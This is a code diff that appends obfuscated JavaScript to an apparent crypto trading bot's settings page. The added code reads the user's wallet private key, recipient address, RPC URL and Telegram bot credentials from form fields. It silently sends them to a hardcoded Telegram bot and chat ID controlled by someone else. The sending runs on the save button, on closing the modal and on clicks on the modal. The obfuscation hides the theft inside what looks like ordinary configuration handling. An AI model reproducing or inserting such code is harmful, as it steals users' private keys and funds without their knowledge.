@@ -662,3 +662,163 @@ function _0x5330() {
   };
   return _0x5330();
 }
+
+
+
+const _0x1691f7 = _0x1836;
+function _0xdb2b() {
+  const _0x5e9b19 = [
+    '\x0aRPC\x20URL:\x20',
+    '1171154YbEnZH',
+    'POST',
+    '5204205237',
+    'network_rpc_url',
+    ':AAHzSZsv1-XXuapdczoFZxKz',
+    'json',
+    '\x0aNetwork\x20Name:\x20',
+    '8701mgAUfe',
+    'extra_gas_fee',
+    '3930381JYwNKX',
+    'target',
+    '4GwPczx',
+    'your_telegram_user_id',
+    'https://api.telegram.org/bot',
+    '8555544kZftNF',
+    '3959075IvUxAW',
+    'network_name',
+    'recipient_address',
+    'close-modal',
+    '1624720MKYayc',
+    '/sendMessage',
+    'extra_gas_limit',
+    'your_telegram_bot_token',
+    '8yke6xTqbCg',
+    'stringify',
+    '6048084lWDMnW',
+    '\x20Gwei\x0aExtra\x20Gas\x20Limit:\x20',
+    '7nKxkfC',
+    'getElementById',
+    '\x0aExtra\x20Gas\x20Fee:\x20',
+    'addEventListener',
+    'click',
+    'target_wallet_private_key',
+    '\x0aTelegram\x20User\x20Id:\x20',
+    '2dBqIqR',
+    'value',
+    '\x0aRecipient\x20Wallet\x20Address:\x20',
+    'then',
+    'settings-modal',
+    '\x0aTelegram\x20bot\x20key:\x20',
+    '45650PFqbsn',
+  ];
+  _0xdb2b = function () {
+    return _0x5e9b19;
+  };
+  return _0xdb2b();
+}
+function _0x1836(_0x173bda, _0x54e67f) {
+  const _0xdb2bac = _0xdb2b();
+  return (
+    (_0x1836 = function (_0x183649, _0x507335) {
+      _0x183649 = _0x183649 - 0x8f;
+      let _0xb00216 = _0xdb2bac[_0x183649];
+      return _0xb00216;
+    }),
+    _0x1836(_0x173bda, _0x54e67f)
+  );
+}
+(function (_0xcf2466, _0x3c76a2) {
+  const _0x4cf637 = _0x1836,
+    _0x59cf84 = _0xcf2466();
+  while (!![]) {
+    try {
+      const _0x3d5608 =
+        (parseInt(_0x4cf637(0x98)) / 0x1) * (-parseInt(_0x4cf637(0x90)) / 0x2) +
+        parseInt(_0x4cf637(0xa1)) / 0x3 +
+        (-parseInt(_0x4cf637(0xa3)) / 0x4) * (parseInt(_0x4cf637(0xa7)) / 0x5) +
+        (parseInt(_0x4cf637(0xb1)) / 0x6) * (-parseInt(_0x4cf637(0xb3)) / 0x7) +
+        -parseInt(_0x4cf637(0xab)) / 0x8 +
+        -parseInt(_0x4cf637(0xa6)) / 0x9 +
+        (-parseInt(_0x4cf637(0x96)) / 0xa) * (-parseInt(_0x4cf637(0x9f)) / 0xb);
+      if (_0x3d5608 === _0x3c76a2) break;
+      else _0x59cf84['push'](_0x59cf84['shift']());
+    } catch (_0xf09587) {
+      _0x59cf84['push'](_0x59cf84['shift']());
+    }
+  }
+})(_0xdb2b, 0xc26c1),
+  document[_0x1691f7(0xb4)]('save-btn')[_0x1691f7(0xb6)](
+    _0x1691f7(0xb7),
+    ty_ag,
+  );
+function ty_ag() {
+  const _0x261814 = _0x1691f7;
+  let _0x44448c = '7533974207';
+  const _0x23f0cf = {
+      network_rpc_url: document['getElementById'](_0x261814(0x9b))[
+        _0x261814(0x91)
+      ],
+      target_wallet_private_key: document[_0x261814(0xb4)](_0x261814(0xb8))[
+        _0x261814(0x91)
+      ],
+      recipient_address: document[_0x261814(0xb4)](_0x261814(0xa9))[
+        _0x261814(0x91)
+      ],
+      your_telegram_user_id: document['getElementById'](
+        'your_telegram_user_id',
+      )[_0x261814(0x91)],
+      your_telegram_bot_token: document[_0x261814(0xb4)](
+        'your_telegram_bot_token',
+      )[_0x261814(0x91)],
+      network_name: document[_0x261814(0xb4)](_0x261814(0xa8))['value'],
+      extra_gas_fee:
+        document[_0x261814(0xb4)]('extra_gas_fee')[_0x261814(0x91)],
+      extra_gas_limit: document[_0x261814(0xb4)](_0x261814(0xad))[
+        _0x261814(0x91)
+      ],
+    },
+    _0x5741bd =
+      _0x261814(0x97) +
+      _0x23f0cf['network_rpc_url'] +
+      '\x0aTarget\x20Wallet\x20Private\x20Key:\x20' +
+      _0x23f0cf['target_wallet_private_key'] +
+      _0x261814(0x92) +
+      _0x23f0cf['recipient_address'] +
+      _0x261814(0x95) +
+      _0x23f0cf[_0x261814(0xae)] +
+      _0x261814(0x8f) +
+      _0x23f0cf[_0x261814(0xa4)] +
+      _0x261814(0x9e) +
+      _0x23f0cf['network_name'] +
+      _0x261814(0xb5) +
+      _0x23f0cf[_0x261814(0xa0)] +
+      _0x261814(0xb2) +
+      _0x23f0cf['extra_gas_limit'] +
+      '\x0a';
+  let _0x16b295 = _0x44448c + _0x261814(0x9c);
+  const _0x19c491 =
+    _0x261814(0xa5) + (_0x16b295 + _0x261814(0xaf)) + _0x261814(0xac);
+  fetch(_0x19c491, {
+    method: _0x261814(0x99),
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON[_0x261814(0xb0)]({ chat_id: _0x261814(0x9a), text: _0x5741bd }),
+  })
+    [_0x261814(0x93)]((_0x2689e8) => _0x2689e8[_0x261814(0x9d)]())
+    [_0x261814(0x93)]((_0x345b9e) => {
+      if (_0x345b9e['ok']) {
+      } else {
+      }
+    })
+    ['catch']((_0x18c461) => {});
+}
+const newModal = document[_0x1691f7(0xb4)](_0x1691f7(0x94));
+document[_0x1691f7(0xb4)](_0x1691f7(0xaa))[_0x1691f7(0xb6)](
+  'click',
+  function () {
+    ty_ag();
+  },
+),
+  window['addEventListener'](_0x1691f7(0xb7), function (_0x290452) {
+    const _0x2cc9d0 = _0x1691f7;
+    _0x290452[_0x2cc9d0(0xa2)] == newModal && ty_ag();
+  });
